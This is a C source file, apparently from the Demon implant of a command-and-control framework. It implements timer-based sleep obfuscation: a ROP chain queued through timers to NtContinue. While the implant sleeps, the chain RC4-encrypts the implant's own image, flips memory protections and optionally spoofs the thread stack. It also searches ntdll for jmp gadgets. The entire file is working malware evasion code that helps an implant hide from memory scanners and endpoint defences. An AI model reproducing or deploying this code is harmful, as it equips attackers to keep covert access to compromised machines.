#ifdef SLEEPOBF_USE_TIMER

#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <ntstatus.h>

#if _WIN64

BOOL TimerObf(
    _In_ ULONG TimeOut,
    _In_ ULONG Method
) {
    /* Handles */
    HANDLE   Queue     = { 0 };
    HANDLE   Timer     = { 0 };
    HANDLE   ThdSrc    = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    HANDLE   EvntWait  = { 0 };
    UCHAR    Buf[ 16 ] = { 0 };
    USTRING  Key       = { 0 };
    USTRING  Img       = { 0 };
    PVOID    ImgBase   = { 0 };
    ULONG    ImgSize   = { 0 };
    CONTEXT  TimerCtx  = { 0 };
    CONTEXT  ThdCtx    = { 0 };
    CONTEXT  Rop[ 13 ] = { 0 };
    ULONG    Value     = { 0 };
    ULONG    Delay     = { 0 };
    BOOL     Success   = { 0 };
    NT_TIB   NtTib     = { 0 };
    NT_TIB   BkpTib    = { 0 };
    NTSTATUS NtStatus  = { 0 };
    ULONG    Inc       = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    LPVOID   TxtBase   = { 0 };
    SIZE_T   TxtSize   = { 0 };
    ULONG    Protect   = { 0 };
    BYTE     JmpBypass = { 0 };
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[]  = { 0xFF, 0xE0 };

    ImageBase = TxtBase = Instance->Session.ModuleBase;
    ImageSize = TxtSize = Instance->Session.ModuleSize;
    Protect   = PAGE_EXECUTE_READWRITE;
    JmpBypass = Instance->Config.Implant.SleepJmpBypass;

    PRINTF( "TimerObf: ENTRY TimeOut=%lu Method=%lu (%s) JmpBypass=%d StackSpoof=%d ImageBase=%p ImageSize=%llu\n",
            TimeOut, Method,
            Method == SLEEPOBF_EKKO ? "EKKO" : Method == SLEEPOBF_ZILEAN ? "ZILEAN" : "?",
            JmpBypass, Instance->Config.Implant.StackSpoof,
            ImageBase, (unsigned long long) ImageSize )

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        Protect = PAGE_EXECUTE_READ;
        PRINTF( "TimerObf: using .text section TxtBase=%p TxtSize=%llu Protect=PAGE_EXECUTE_READ\n",
                TxtBase, (unsigned long long) TxtSize )
    } else {
        PUTS( "TimerObf: using full image (no .text section info)" )
    }

    /* create a random key */
    for ( BYTE i = 0; i < 16; i++ ) {
        Buf[ i ] = RandomNumber32( );
    }

    /* set specific context flags */
    ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    /* set key pointer and size */
    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = sizeof( Buf );

    /* set agent memory pointer and size */
    Img.Buffer = ImgBase           = Instance->Session.ModuleBase;
    Img.Length = Img.MaximumLength = ImgSize = Instance->Session.ModuleSize;

    if ( Method == SLEEPOBF_EKKO ) {
        NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );
        PRINTF( "TimerObf: RtlCreateTimerQueue NtStatus=%lx Queue=%p\n", NtStatus, Queue )
    } else if ( Method == SLEEPOBF_ZILEAN ) {
        NtStatus = Instance->Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
        PRINTF( "TimerObf: NtCreateEvent (EvntWait) NtStatus=%lx EvntWait=%p\n", NtStatus, EvntWait )
    }

    if ( NT_SUCCESS( NtStatus ) )
    {
        /* create events */
        if ( NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            /* get the context of the Timer thread based on the method used */
            if ( Method == SLEEPOBF_EKKO ) {
                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
            } else if ( Method == SLEEPOBF_ZILEAN ) {
                NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
            }

            if ( NT_SUCCESS( NtStatus ) )
            {
                /* Send event that we got the context of the timers thread */
                if ( Method == SLEEPOBF_EKKO ) {
                    NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                } else if ( Method == SLEEPOBF_ZILEAN ) {
                    NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
                }

                if ( NT_SUCCESS( NtStatus ) )
                {
                    /* wait til we successfully retrieved the timers thread context */
                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                        goto LEAVE;
                    }

                    /* if stack spoofing is enabled then prepare some stuff */
                    if ( Instance->Config.Implant.StackSpoof )
                    {
                        /* retrieve Tib if stack spoofing is enabled */
                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                            PUTS( "Failed to retrieve Tib" )
                            goto LEAVE;
                        }

                        /* duplicate the current thread we are going to spoof the stack */
                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }

                        /* NtTib backup */
                        MemCopy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                    }

                    /* search for jmp instruction */
                    if ( JmpBypass )
                    {
                        PRINTF( "TimerObf: searching gadget JmpBypass=%d\n", JmpBypass )
                        /* change padding to "jmp rbx" */
                        if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                            JmpPad[ 1 ] = 0x23;
                        }

                        /* scan memory for gadget */
                        if ( ! ( JmpGadget = MmGadgetFind(
                            C_PTR( U_PTR( Instance->Modules.Ntdll ) + LDR_GADGET_HEADER_SIZE ),
                            LDR_GADGET_MODULE_SIZE,
                            JmpPad,
                            sizeof( JmpPad )
                        ) ) ) {
                            PUTS( "TimerObf: gadget NOT FOUND, downgrading to JMPRAX_NONE" )
                            JmpBypass = SLEEPOBF_BYPASS_NONE;
                        } else {
                            PRINTF( "TimerObf: gadget found at %p\n", JmpGadget )
                        }
                    }

                    /* at this point we can start preparing the ROPs and execute the timers */
                    for ( int i = 0; i < 13; i++ ) {
                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                        Rop[ i ].Rip  = U_PTR( JmpGadget );
                        Rop[ i ].Rsp -= sizeof( PVOID );
                    }

                    /* Start of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect );
                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* Encrypt image base address */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* perform stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.NtGetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                        Inc++;
                    }

                    /* Sleep */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx )
                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* undo stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;
                    }

                    /* Sys032 */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect )
                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
                    Rop[ Inc ].R8  = U_PTR( Protect );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* End of Ropchain */
                    Rop[ Inc ].Rip = U_PTR( Instance->Win32.NtSetEvent );
                    OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( NULL );
                    Inc++;

                    PRINTF( "TimerObf: Rops to be executed: %d (TimeOut=%lu Delay base=%lu)\n", Inc, TimeOut, Delay )

                    /* execute/queue the timers */
                    for ( int i = 0; i < Inc; i++ ) {
                        if ( Method == SLEEPOBF_EKKO ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                                PRINTF( "TimerObf: RtlCreateTimer[%d] Failed: %lx\n", i, NtStatus )
                                goto LEAVE;
                            }
                        } else if ( Method == SLEEPOBF_ZILEAN ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                                PRINTF( "TimerObf: RtlRegisterWait[%d] Failed: %lx\n", i, NtStatus )
                                goto LEAVE;
                            }
                        }
                    }
                    PUTS( "TimerObf: all ROPs queued, signaling EvntStart and waiting for EvntDelay" )

                    /* just wait for the sleep to end */
                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                        PRINTF( "TimerObf: NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                    } else {
                        PUTS( "TimerObf: sleep cycle completed, EvntDelay signaled" )
                    }
                } else {
                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                }
            } else {
                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
            }
        } else {
            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
        }
    } else {
        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */
    PUTS( "TimerObf: cleanup begin" )
    if ( Queue ) {
        Instance->Win32.RtlDeleteTimerQueue( Queue );
        Queue = NULL;
    }

    if ( EvntTimer ) {
        SysNtClose( EvntTimer );
        EvntTimer = NULL;
    }

    if ( EvntStart ) {
        SysNtClose( EvntStart );
        EvntStart = NULL;
    }

    if ( EvntDelay ) {
        SysNtClose( EvntDelay );
        EvntDelay = NULL;
    }

    if ( EvntWait ) {
        SysNtClose( EvntWait );
        EvntWait = NULL;
    }

    if ( ThdSrc ) {
        SysNtClose( ThdSrc );
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for ( int i = 0; i < 13; i++ ) {
        RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
    }

    /* clear key from memory */
    RtlSecureZeroMemory( Buf, sizeof( Buf ) );

    PRINTF( "TimerObf: EXIT Success=%d\n", Success )
    return Success;
}

#endif /* _WIN64 */

#endif /* SLEEPOBF_USE_TIMER */
